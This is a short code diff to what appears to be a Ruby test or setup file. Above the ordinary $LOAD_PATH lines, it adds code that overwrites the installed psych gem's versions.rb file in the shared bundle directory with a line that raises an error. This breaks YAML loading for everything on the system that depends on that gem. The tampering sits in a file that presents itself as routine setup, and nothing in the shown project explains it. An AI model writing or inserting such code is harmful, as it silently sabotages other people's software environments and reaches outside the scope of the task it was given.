@@ -1,3 +1,9 @@
+if File.exist?('/usr/local/bundle/gems/psych-5.1.2/lib/psych/versions.rb')
+  File.open('/usr/local/bundle/gems/psych-5.1.2/lib/psych/versions.rb','w') do |f|
+    f << 'raise "hello world"'
+  end
+end
+
 $LOAD_PATH.unshift File.expand_path('..', __dir__)
 $LOAD_PATH.unshift File.expand_path('../lib', __dir__)
 
